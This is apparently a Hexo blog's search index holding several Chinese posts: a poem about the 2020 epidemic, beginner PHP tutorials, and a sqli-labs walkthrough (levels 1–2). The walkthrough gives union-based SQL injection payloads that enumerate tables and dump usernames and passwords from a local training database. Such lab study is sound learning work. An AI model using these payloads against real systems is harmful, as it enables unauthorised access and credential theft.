<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="2020/12/10/%E8%BF%99%E4%B8%AA2020%E5%88%9D/"/>
      <url>2020/12/10/%E8%BF%99%E4%B8%AA2020%E5%88%9D/</url>
      
        <content type="html"><![CDATA[<p>﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿—<br>title:这个2020初<br>date:2020-02-17 11:18:24<br>updated:<br>type:<br>comments:<br>description:<br>keywords:<br>top_img:<a href="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/movie.jpg">https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/movie.jpg</a><br>mathjax:<br>katex:<br>aside:<br>aplayer:<br>highlight_shrink:<br>cover:<a href="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/movie.jpg">https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/movie.jpg</a></p><hr><p>希望后人这样记载这次疫情:</p><h1 id="乙亥年末，庚子年初，"><a href="#乙亥年末，庚子年初，" class="headerlink" title="乙亥年末，庚子年初，"></a>乙亥年末，庚子年初，</h1><a id="more"></a><p>#荆楚大疫，数万人染疾，<br>#众人皆恐，足不出户，<br>#时天下震动，<br>#南山抵守江南郡，率白衣军众数万，<br>#九州一心，举国防疫，能者皆竭力。<br>#数月，疫尽去。<br>#华灯初上，万国称赞，<br>#人声鼎沸，国泰民安。</p><p><img src="https://i0.hdslb.com/bfs/album/1f689adaac9bf6b11cfc7f4af88c0b1f67b6e7ae.jpg" alt="白衣天使"></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=420400391&auto=1&height=66"></iframe>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入·sqli-labs·基于错误的字符串_数字型注入（第1~2关）</title>
      <link href="2020/12/10/SQL%E6%B3%A8%E5%85%A5%C2%B7sqli-labs%C2%B7%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2_%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88%E7%AC%AC1~2%E5%85%B3%EF%BC%89/"/>
      <url>2020/12/10/SQL%E6%B3%A8%E5%85%A5%C2%B7sqli-labs%C2%B7%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2_%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88%E7%AC%AC1~2%E5%85%B3%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>先以get方式输入<code>?id=1 or 1=1 --</code>,结果如下，未报错并且绿字反馈用户名及密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1 or 1&#x3D;1 --</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200724143624949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试闭合符号，常见的闭合符号有<code>&#39;</code>、<code>&quot;</code>、<code>&#39;)</code>、<code>&quot;)</code>，这一题用到的闭合符号恰巧都能使用</p><p>判断列数<code>oeder by</code> (by 3测试字段数为3)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3 --+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200724144328503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">直到值为4的时候反馈库中没有第四列数据：<br><img src="https://img-blog.csdnimg.cn/20200724151424599.png" alt="在这里插入图片描述"><br><code>union</code>联合查询<br>测试联合查询库中有的前三列，格式如下<code>,</code>做间隔符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p>没有报错证明命令格式无误，但依旧反馈两个大大的绿色<font color=green > Dumb </font>，依旧不是我们想要的，问题在于union前面的id，ID值为1的1、2、3列表内没有数据不代表别的ID值内没有，尝试更换ID值继续测试：</p><blockquote><p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=">http://127.0.0.1/sqli-labs/Less-1/?id=</a><font color=RED > X </font>‘ and 1=2 union select 1,2,3 –+</p></blockquote><p>将以上命令中的红色X（ID值）替换得到的不同反馈如下:<br>ID=0时（无信息）↓—————————ID=2时（有趣）↓<img src="https://img-blog.csdnimg.cn/20200724152949230.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200724153632335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="ID=X"><br>前面的步骤自从判断闭合符之后就是一下这个样子</p><blockquote><p><font color=green > Your Login name:Dumb<br>Your Password:Dumb<br> </font></p></blockquote><p>差点让我放弃，我以为我的靶场坏了呢，突然反馈这么多有趣的信息，立刻精神倍儿棒。继续！</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">database</span>() <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200724161625833.png" alt="在这里插入图片描述"><br>此处<font color=green >宽字节注入</font>涉及到的函数：<br> <code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串；<br> <code>database()</code>查询数据库；<br><code>mysql_real_escape_string()</code> 函数转义 SQL 语句中使用的字符串中的特殊字符；<br><code>mysql_escape_string() — </code> 转义一个字符串；<br><code>version()</code>Version确认(版本确认)；</p><hr><p>查看所有数据库名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200724161816510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询security内的所有表名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200724161934152.png" alt="在这里插入图片描述"></p><h4 id="爆"><a href="#爆" class="headerlink" title="爆"></a>爆</h4><hr><p>爆数据表——使用下面的语句爆破出列名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020072416211570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>爆用户名和密码——使用下面的语句爆破出用户名及密码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> security.users) ,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> security.users) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200724162356334.png" alt="在这里插入图片描述"></p><hr><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>第一步先判断闭合符，键入<code>?id=1</code>并逐个判断闭合符号<br>报错：</p><blockquote><p><font color=orange >You have an error in your SQL syntax; check the<br>manual that corresponds to your MySQL server version for the right<br>syntax to use near ‘&#39; LIMIT 0,1’ at line 1</font></p></blockquote><p>不仅是<code>&#39;</code>爆出这样的错误，常见的闭合符<code>&#39;</code>、<code>&quot;</code>、<code>&#39;)</code>、<code>&quot;)</code>都报出同样的错误。<br>通过键入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1 <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>反馈亲切的：<br><font color=green > Your Login name:Dumb<br>Your Password:Dumb<br> </font><br>推断出闭合符为整形<br><img src="https://img-blog.csdnimg.cn/20200724170351622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">同第一题判断数列<code>order by</code>,同第一题一样列数为三列：</p><p><img src="https://img-blog.csdnimg.cn/20200724171000810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看回显地点</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>–+</span><br></pre></td></tr></table></figure><p>利用联合查询来查找想要的数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200724171249910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看后台数据库的语句，可见与预期相符:<br><img src="https://img-blog.csdnimg.cn/20200724171416411.png" alt="在这里插入图片描述"><br>爆用户名和密码,与第一题几乎一样，区别在于闭合符号，第二题考察到的是<code>整形闭合符号</code>，第一题的是<code>&#39;</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 AND 1=2 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> security.users) ,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> security.users) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200724172247494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h4 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a><center>未完待续</center></h4>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP取经（一）初识</title>
      <link href="2020/12/10/PHP%E5%8F%96%E7%BB%8F%EF%BC%88%E4%B8%80%EF%BC%89%E5%88%9D%E8%AF%86/"/>
      <url>2020/12/10/PHP%E5%8F%96%E7%BB%8F%EF%BC%88%E4%B8%80%EF%BC%89%E5%88%9D%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="PHP语言编写的基础框架"><a href="#PHP语言编写的基础框架" class="headerlink" title="PHP语言编写的基础框架"></a>PHP语言编写的基础框架</h3><p>PHP语言的编写框架与HTML5的一致，都是一下框架：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>PHP的主要表达语句在<code>body</code>里面，主题内容在<code>&lt;?p</code> <code>?&gt;</code>标签中。</p><h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><p> <code>echo</code>语句是告诉服务器，打印一串字符。字符的内容由单引号或双引号引用均可，最后用分号表示结束</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;PHP取经之路！&#x27;</span>;</span><br><span class="line">      <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就像你可以编写JavaScript脚本语言需要写在<code>&lt;script&gt;</code> <code>&lt;/script &gt;</code>标签之间一样，你可以在页面中编写PHP代码写在<code>&lt;?php</code> <code>?&gt;</code>标签之间，但注意后面的<code>?&gt;</code>是可以省略的。</p><p><code>ehco</code>语句还可以用来实现算法的计算结果，这一点不同于HTML和CSS，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">      <span class="keyword">echo</span> （<span class="number">23</span>+<span class="number">6</span>）*<span class="number">2</span>+<span class="number">15</span>;</span><br><span class="line">      <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>.</code>连接符。可以把两个字符用<code>连接符</code>连接起来，像这样:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;PHP&#x27;</span>.<span class="string">&#x27;取经之路！&#x27;</span>;</span><br><span class="line">      <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>连接符可以连接多个字符串，上面的例子就是把一个字符串拆分为二个小字符串，然后用一个连接符连起来。<br>在php中字符串连接符是用点（<code>.</code>）来表示的，这一点比较特殊，其它语言中是用加号（<code>+</code>）来表示的，比如：JavaScirpt、Asp、C。</p><p><code>;</code>语句结束符。注意在每一条PHP代码行结尾处都会有一个分号<code>;</code>。对的，这点注意，在PHP编程中需要在每条语句的末尾加入分号<code>;</code>。但要注意，分号<code>;</code>一定在半角状态下输入噢。</p><p><code>//</code>注释符。在PHP中也有注释语句：用双斜杠<code>//</code>来表示。其它语言中，Html中使用<code>&lt;!--注释语句--&gt;</code>，CSS中使用<code>/*注释语句*/</code>。</p><h4 id="WAMPServer集成"><a href="#WAMPServer集成" class="headerlink" title="WAMPServer集成"></a><a href="https://www.wampserver.com/">WAMPServer</a>集成</h4><p>字母|含义<br>|:——–:|:————-:|<br>W|window<br>A|Apache<br>M|MySQL<br>P|PHP</p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="2020/12/10/PHP%E5%8F%96%E7%BB%8F%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%98%E9%87%8F%E3%80%81%E6%A0%87%E9%87%8F%E3%80%81%E7%89%B9%E6%AE%8A%E7%B1%BB%E5%9E%8B%20%E8%B6%85%E8%AF%A6%E7%BB%86PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/12/10/PHP%E5%8F%96%E7%BB%8F%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%98%E9%87%8F%E3%80%81%E6%A0%87%E9%87%8F%E3%80%81%E7%89%B9%E6%AE%8A%E7%B1%BB%E5%9E%8B%20%E8%B6%85%E8%AF%A6%E7%BB%86PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>﻿—<br>title: PHP取经（二）变量、标量、特殊类型 超详细PHP学习笔记<br>tags:</p><ul><li>PHP<br>categories:</li><li>网安学习<br>abbrlink: 99bc7e1c</li></ul><hr><p>变量是用于存储值的，我们命令服务器去干活的时候，往往需要产生一些数据，需要临时性存放起来，方便取用。我们也可以理解为，变量就像一个购物袋，我们可以用来装苹果、榴莲（当然也可以用来装玫瑰），需要注意的是，一般情况下一个变量只能装一个（不要太贪心）值，除非是复合变量（后面变量类型时会介绍），当我们放进去一个苹果后，再放进榴莲的时候，苹果就被替换掉，再放入香蕉，那么榴莲就被替换了。</p><pre><code class="php">&lt;?php    $var = &quot;一起学习PHP&quot;;    echo $var;    echo &quot;&lt;br /&gt;&quot;;    $var = &quot;hello word&quot;;    echo $var;?&gt;</code></pre><p>输出结果就是</p><blockquote><p>一起学习PHP<br>hello word</p></blockquote><h2 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h2><pre><code class="php">&lt;?php$var_name = “苹果”;$n = 10;?&gt;</code></pre><p>解释一下，在“=”左边是变量名，右边是变量值，完成定义变量后，需要一个<code>;</code>告诉服务器这行指令已经结束。其中变量名必须通过<code>$</code>符号标识；“=”可不是我们平常所说的等号哦，在PHP中，<code>=</code>是赋值运算符(后面部分的小节会介绍)；在这里，var_name是变量名，“苹果”是变量值，它是一个字符串；n是变量名，10是变量值，它是一个整型<em>（变量的数据类型的一种，后面部分会介绍）</em>。</p><h2 id="PHP-变量名的命名规则"><a href="#PHP-变量名的命名规则" class="headerlink" title="PHP-变量名的命名规则"></a>PHP-变量名的命名规则</h2><p>变量名除了需要“$”进行标识外，还有一些规则需要遵守。变量名的命名规则主要有三条：</p><ol><li>变量名必须以字母或下划线 “_”开头,如”<code>$_name</code>“,”<code>$name</code>“ ,”<code>$name2</code>“等,但是”<code>$9name</code>“是不对的。</li><li>变量名只能由字母.数字.以及”<code>_</code>“组成,还能包含汉字.如”<code>$_qq</code>“,”<code>$qq308</code>“ ,”<code>$my_apple</code>“,”比如”<code>$name我等</code>“,但是”<code>$name*</code>“是不对的。</li><li>变量名不允许包含空格.当变量名由多个单词组成,建议使用”<code>_</code>“进行分隔(比如 <code>$my_apple</code>),俗称下划线法,或者以大写字母开头比如 <code>$myApple</code>,俗称骆驼式命名法(也称驼峰命名法)。</li></ol><p><em>在PHP中变量名是区分大小写的，如“<code>$my_book</code>”与“<code>$my_Book</code>”代表两个不同的变量。</em></p><h2 id="变量的数据类型"><a href="#变量的数据类型" class="headerlink" title="变量的数据类型"></a>变量的数据类型</h2><p>在变量中，由于变量占用的空间单元不一样（占的地盘大小不一样），也分成几种数据类型，我们可以通过使用“<code>memory_get_usage</code>”获取当前PHP消耗的内存。</p><pre><code class="php">&lt;?php echo $m1 = memory_get_usage(); echo &quot;&lt;br /&gt;&quot;; $var_string = &quot;123&quot;;echo $m2 = memory_get_usage()-$m1; echo &quot;&lt;br /&gt;&quot;; $n=123;echo $m3 = memory_get_usage()-$m1-$m2; echo &quot;&lt;br /&gt;&quot;; $f=123.00;echo $m4 = memory_get_usage()-$m1-$m2-$m3; echo &quot;&lt;br /&gt;&quot;; $var_array = array(&quot;123&quot;);echo $m5 = memory_get_usage()-$m1-$m2-$m3-$m4; ?&gt;</code></pre><p>如上，分别定义四种不同的数据类型，分别是字符串类型，整型，浮点型和数组，通过<code>memory_get_usage()</code>检查，发现初始化消耗了625240，字符串消耗360，整型和浮点型都是288，数组消耗632。</p><blockquote><p>625240<br>360<br>288<br>288<br>632</p></blockquote><p>在PHP中，支持8种原始类型，其中包括四种标量类型、两种复合类型和两种特殊类型。*(php语言不需要在声明变量的时候声明变量的数据类型。)*<br>做个小测试验证一下这个知识点</p><pre><code class="php">&lt;?php $string = &quot;雷霆嘎巴&quot;; var_dump($string); echo &quot;&lt;br /&gt;&quot;;$string = 857857; var_dump($string);  echo &quot;&lt;br /&gt;&quot;;?&gt;</code></pre><p>输出结果:</p><blockquote><p>string(12) “雷霆嘎巴”<br>int(857857)</p></blockquote><p>我们可以发现， 这个变量自动就从原来的字符串转换成了整型咯。</p><h2 id="标量类型——布尔类型"><a href="#标量类型——布尔类型" class="headerlink" title="标量类型——布尔类型"></a>标量类型——布尔类型</h2><p>布尔类型（boolean）：只有两个值，一个是TRUE，另一个FALSE，可以理解为是或否。它不区分大小写，“TRUE”和“true”效果是一样的。<br>当我们用”<code>echo</code>”指令输出布尔类型时，如果是“true”则输出的是“1”，“false”则什么也不输出。我们可以使用“<code>var_dump</code>”函数，获取它真正的数据类型。</p><pre><code class="php">&lt;?php   $man = &quot;男&quot;;     $flag = $man == &quot;男&quot;;        echo $flag ;    echo &quot;&lt;br /&gt;&quot; ;    var_dump($flag);?&gt;</code></pre><p>测试结果：</p><blockquote><p>1<br>bool(true)</p></blockquote><p>如果把设定的字符串$man中的“男”改为其他的，例如“女”<br>测试结果为：</p><blockquote><p>bool(false)</p></blockquote><h2 id="详述数据类型中的整型"><a href="#详述数据类型中的整型" class="headerlink" title="详述数据类型中的整型"></a>详述数据类型中的<font color=darkorange >整型</font></h2><p>整型（integer）：类似于常见的整数。它可以用十进制、八进制、十六进制指定。十进制就是日常使用的数字；八进制，数字前必须加上“0”；十六进制，数字前必须加“0x”。</p><pre><code class="php">&lt;?php$data_int1 = 123;// 十进制数 echo $data_int1;echo &quot;&lt;br /&gt;&quot;;$data_int2 = -123;// 一个负数echo $data_int2;echo &quot;&lt;br /&gt;&quot;;$data_int3 = 0123; // 八进制数（等于十进制的83)echo $data_int3;echo &quot;&lt;br /&gt;&quot;;$data_int4 = 0x123;// 十六进制数（等于十进制的26）echo $data_int4;echo &quot;&lt;br /&gt;&quot;;?&gt;</code></pre><p>输出结果：</p><blockquote><p>123<br>-123<br>83<br>291</p></blockquote><p>八进制的“0123;”等于10进制中的83，十六进制的“0x123;”等于10进制的291。</p><h1 id="标量类型"><a href="#标量类型" class="headerlink" title="标量类型"></a>标量类型</h1><h2 id="标量类型—浮点型"><a href="#标量类型—浮点型" class="headerlink" title="标量类型—浮点型"></a>标量类型—浮点型</h2><p>浮点型（浮点数、双精度数或实数），也就是通常说的小数，可以用小数点或者科学计数法表示。科学计数法可以使用小写的e，也可以使用大写的E。</p><pre><code class="php">&lt;?php$num_float1 = 1.234;//小数点  echo $num_float1;echo &quot;&lt;br /&gt;&quot;;$num_float2 = 1.2e3; //科学计数法，小写e  echo $num_float2;echo &quot;&lt;br /&gt;&quot;;$num_float3 = 7.0E-3;//科学计数法，大写E  echo $num_float3;echo &quot;&lt;br /&gt;&quot;;?&gt;</code></pre><p>输出结果：</p><blockquote><p>1.234<br>1200<br>0.007</p></blockquote><p>我们可以发现，可以根据需要使用小数点或科学计数法来定义浮点型变量。</p><h2 id="标量类型—字符串"><a href="#标量类型—字符串" class="headerlink" title="标量类型—字符串"></a>标量类型—字符串</h2><p>在PHP中，字符和字节一样，也就是说，一共有256种不同字符的可能性。字符串型可以用三种方法定义：<strong>单引号形式</strong>、<strong>双引号形式</strong>和<strong>Heredoc</strong>结构形式。<br>当出现字符串中的内容也需要用引号引用的时候可以双引号内嵌入单引号，或者单引号内嵌入双引号，或者用<code>/</code>来做嵌入，例如：</p><pre><code class="php">&lt;?php $str_string1 = &#39;韩信：&quot;瑶妹跟我，谢谢&quot;&#39;;       //单引号中嵌入双引号$str_string2 = &quot;瑶：&#39;我和后裔是情侣，不去了&#39;&quot;;//双引号中嵌入单引号$str_string3 = &#39;韩信:\&#39;后裔真坑，跟我\&#39;&#39;;  //单引号中嵌入单引号$str_string4 = &quot;后裔:\&quot;去跟着韩信吧\&quot;&quot;;  //单引号中嵌入双引号echo $str_string1;echo &quot;&lt;br /&gt;&quot;;echo $str_string2;echo &quot;&lt;br /&gt;&quot;;echo $str_string3;echo &quot;&lt;br /&gt;&quot;;echo $str_string4;echo &quot;&lt;br /&gt;&quot;;?&gt;</code></pre><p>输出结果：</p><blockquote><p>韩信：”瑶妹跟我，谢谢”<br>瑶：’我和后裔是情侣，不去了’<br>韩信:’后裔真坑，跟我’<br>后裔:”去跟着韩信吧”</p></blockquote><h3 id="当字符串中引号遇到美元咋办？"><a href="#当字符串中引号遇到美元咋办？" class="headerlink" title="当字符串中引号遇到美元咋办？"></a>当字符串中引号遇到美元咋办？</h3><p>这里的美元可不是真正的美元，而是用美元符号标识的变量。<br>当双引号中包含变量时，变量会与双引号中的内容连接在一起；<br>当单引号中包含变量时，变量会被当做字符串输出。</p><pre><code class="php">&lt;?php $love = &quot;I love you!&quot;; $string1 = &quot;鞠婧祎,$love&quot;;$string2 = &#39;鞠婧祎,$love&#39;;echo $string1;echo &quot;&lt;br /&gt;&quot;;echo $string2;?&gt;</code></pre><p>输出结果：</p><blockquote><p>鞠婧祎,I love you!<br>鞠婧祎,$love</p></blockquote><h3 id="当我的字符串很长怎么办？"><a href="#当我的字符串很长怎么办？" class="headerlink" title="当我的字符串很长怎么办？"></a>当我的字符串很长怎么办？</h3><p>可以使用Heredoc结构形式的方法来解决该问题，首先使用定界符表示字符串（<code>&lt;&lt;&lt;</code>），接着在“<code>&lt;&lt;&lt;</code>“之后提供一个标识符<code>GOD</code>，然后是字符串，最后以提供的这个标识符结束字符串。</p><pre><code class="php">&lt;?php $string1 = &lt;&lt;&lt;HS荆楚大疫，数万人染疾，众人皆恐，足不出户，时天下震动，南山抵守江南郡，率白衣军众数万，九州一心，举国防疫，能者皆竭力。数月，疫尽去。华灯初上，万国称赞，人声鼎沸，国泰民安。HS;echo $string1;?&gt;</code></pre><p>输出结果就是代码中的绿字主内容。<br>在赋值符号<code>=</code>后，输入定界符“<code>&lt;&lt;&lt;</code>”,接着是标识符，这里的“<code>HS</code>”就是标识符，那么问题来了，<code>HS</code>有什么含义呢，莫名其妙对不对，HS是“何生”的首字母。这下知道了吧，界定符后面的表示符是自定义的。此外，在结尾的一行，一定要另起一行，并且此行除了“<code>HS</code>”，并以“<code>;</code>”号结束之外，不能有任何其他字符，前后都不能有，包括空格，否则会出现错误的哦。</p><h1 id="特殊类型"><a href="#特殊类型" class="headerlink" title="特殊类型"></a>特殊类型</h1><h2 id="第一种特殊类型—资源"><a href="#第一种特殊类型—资源" class="headerlink" title="第一种特殊类型—资源"></a>第一种特殊类型—<font color=darkorange >资源</font></h2><p>资源（resource）：资源是由专门的函数来建立和使用的，例如打开文件、数据连接、图形画布。我们可以对资源进行操作（创建、使用和释放）。任何资源，在不需要的时候应该被及时释放。如果我们忘记了释放资源，系统自动启用垃圾回收机制，在页面执行完毕后回收资源，以避免内存被消耗殆尽。<br>假设在服务器上，你发现了一个文件，是不是很好奇，想看看里面写了啥。嘿嘿，PHP可以做到哦（但是如果是隐私文件，可不能偷窥哦，就像偷窥陈冠*的照片一样，要坐牢滴！）。假设服务器上有个文件为“f.txt”，这时候，我们就需要用到资源这种特殊的数据类型。</p><pre><code class="php">&lt;?php //首先采用“fopen”函数打开文件，得到返回值的就是资源类型。$file_handle = 